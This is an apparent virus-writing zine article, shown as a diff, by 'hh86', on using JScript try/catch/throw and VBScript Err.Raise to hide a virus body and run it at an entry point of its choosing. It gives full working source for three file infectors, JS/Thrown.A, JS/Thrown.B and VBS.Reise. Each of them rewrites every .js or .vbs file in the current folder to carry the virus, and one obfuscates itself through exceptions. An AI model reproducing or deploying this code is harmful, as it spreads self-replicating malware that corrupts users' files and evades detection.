@@ -1,0 +1,237 @@
+                              I Err.Raise, you fall
+                                       by               
+                                      hh86
+
+Exceptions
+
+Try and Catch are the most widely used statements for exception handlers in most
+languages. When we run code that might be vulnerable to unexpected exceptions we
+can run it in Try block.   If an exception occurs, then the  Catch block handles
+the problem.  This mechanism also includes a statement to cause an exception. It
+is  the  Throw  statement.  The Throw  statement  can  specify an exception info
+to be supplied to the  Catch (it should decide then on handling it or not).
+
+
+Throw it
+
+My idea  for an engine is to create a decryptor to build the virus body piece by
+piece using Try, Catch and Throw.   In Try block we raise an exception, in Catch
+we rebuild, it would be like this:
+
+        a=""
+        try
+        {
+            throw "f = new Activ"
+        }
+        catch(e) {a += e}
+        try
+        {
+            throw "eXObject("
+        }
+        catch(y) {a += y}
+
+       //now run the code
+
+I have created an engine, it is so simple, but the result is very good.
+Here is JS/Thrown.A:
+
+//hh86
+h()
+function h()
+{
+    //JS/Thrown.A
+    f=new ActiveXObject("Scripting.FileSystemObject")
+    q = rn()
+    k = q+"=[];"
+    l = "" + h
+    for(i=0;i<l.length;i++)
+    {
+         c = l.substr(i,1).charCodeAt(0).toString(16)
+         if(c=="a" || c=="d"){c ="0"+c}
+         y = rn()
+         k = k + "try{throw\"\\x" + c + "\"}catch(" + y + ")" + "{" + q + ".push(" + y + ")};"
+    }
+
+    k = k + ";" + q + "=" + q + ".join(\"\");eval(\"h();\"+" + q + ");"
+    for(y=new Enumerator(f.getfolder(".").files);!y.atEnd();y.moveNext())
+    {
+        x=y.item();
+        if(f.GetExtensionName(x).toLowerCase()=="js")
+        {
+            try
+            {
+                b=f.OpenTextFile(x);h=b.ReadAll();b.Close();
+                if(h.substr(0,6)!="//hh86")
+                {
+                    p=x.Attributes;x.Attributes=0;l=f.CreateTextFile(x);l.Write(k+h);l.Close();x.Attributes=p
+                }
+            }
+            catch(e)
+            {}
+        }
+    }
+    function rn()
+    {
+        return "r"+f.GetTempName().substr(3,5)
+    }
+}
+
+
+EPO
+
+We will use the function constructor like this: 
+
+        try
+        {
+            throw function(){WScript.Echo("Oh! Hello :)")}
+        }
+        catch(e) {e()}
+
+
+Awesome!
+An  obvious  extension  to that code is not calling the virus body whithin Catch
+block, sample 1.  However, Catch is executed when function returns.  So, what if
+we want to decrypt something in function and build in Catch? Then we use return,
+sample 2.  Yet we have another trick, we do not clearly specify we have function
+to be executed (without "()"), in this case we need to run in Catch, sample 3.
+
+Sample 1:
+        try 
+        {
+            throw g()
+        }
+        catch(e) {}
+        function g() {...}
+
+
+Sample 2:
+
+        a=""
+        try 
+        {
+            throw g()
+        }
+        catch(e) {a += e}
+        ...
+        function g() {return "f = new Activ"}
+
+
+Sample 3:
+        try
+        {
+            throw g
+        }
+        catch(e) {e()}
+        function g() {...}
+
+And then we can use sample 2, but returning a function:
+
+        try
+        {
+            throw g();
+        }
+        catch(e){e()}
+        function g()
+        {
+            return function(){WScript.Echo("Oh, Hello again and again!")}
+        } 
+
+Throw  can  be used in so many ways in such a functional language as is JScript.
+Here is JS/Thrown.B:
+
+//hh86
+try{throw function t()
+{
+    /*JS/Thrown by hh86*/
+    f=new ActiveXObject("Scripting.FileSystemObject");
+    for(y=new Enumerator(f.getfolder(".").files);!y.atEnd();y.moveNext())
+    {
+        x=y.item();
+        if(f.GetExtensionName(x).toLowerCase()=="js")
+        {
+            try
+            {
+                b=f.OpenTextFile(x);h=b.ReadAll();b.Close();
+                if(h.substr(0,6)!="//hh86")
+                {
+                    p=x.Attributes;x.Attributes=0;l=f.CreateTextFile(x);l.Write("//hh86\rtry{throw "+t+"}catch(e){e()}"+"\r"+h);l.Close();x.Attributes=p
+                }
+            }
+            catch(e)
+            {}
+        }
+    }
+}
+}
+catch(e){e()}
+
+
+VBScript
+
+VBScript has no Try, Catch and Throw statement. Instead we have 'On Error Resume
+Next' and 'On Error GoTo 0'.   The  first  one is so obvious, the latter goes by
+default, no exception handling is used.   Method Raise from Err object can cause
+an exception on purpose.  It has some arguments: Number (long), Source (string),
+Description (string), HelpFile (string), HelpContext (string).  Since the latter
+On Error does not support GoTo Label, we cannot specify a routine to handle err.
+On Resume Next, when an exception  happens the IP is moved to next and continues
+execution, unpredictableness  happens  next.  If we adjust the JScript idea then
+we can do the next:
+
+
+    on error resume next                'must specify
+    err.raise asc("s")                  'cause exception, send char code
+    v = v & chr(err)                    'get and concatenate
+    err.raise asc("e")
+    v = v & chr(err)
+    err.raise asc("t")
+    v = v & chr(err)
+
+
+We send every  character code of the source as exception number.  We concatenate
+the character and so it continues.  I do not use 'Err.Number' because Err itself
+returns  the  exception number, for optimisation sake.  You can send code in any
+form you want, as string, or number, etcetera.
+
+
+EPO
+
+Good news is, I finally found how to use it to call a routine. So simple.
+Instead of Number or description or help of any kind, we will pass the name of a
+function (not a Sub, not a Label.  Function). The function will be automatically
+executed before the IP is moved to next line.  So, we hook  the execution there.
+VB6 behaves the same with this.  Here goes the code, very simple.
+
+    on error resume next
+    err.raise v                         'au revoir ()
+    ...                                 'host code
+
+    function v()
+    ...                                 'virus code
+    end function
+
+Great, isn't it? ;)
+
+Here is VBS.Reise:
+
+:on error resume next
+'VBS.reise by halloweeney
+set f=createobject("scripting.filesystemobject")
+u=left(f.gettempname,8)
+v="function "+u+"()"+":"+f.opentextfile(wscript.scriptfullname).readall+":end function"
+set o=f.getfolder(".")
+for each x in o.files
+    if lcase(f.getextensionname(x))="vbs"then
+        a=x.attributes
+        x.attributes=0
+        g=f.opentextfile(x).readall
+        if err=0then
+            if left(g,1)<>":"then
+                set s=f.createtextfile(x)
+                s.write(":on error resume next:err.raise "+u+vbcrlf+g+vbcrlf+v)
+                s.close
+            end if
+        end if
+        x.attributes=a
+    end if
+next
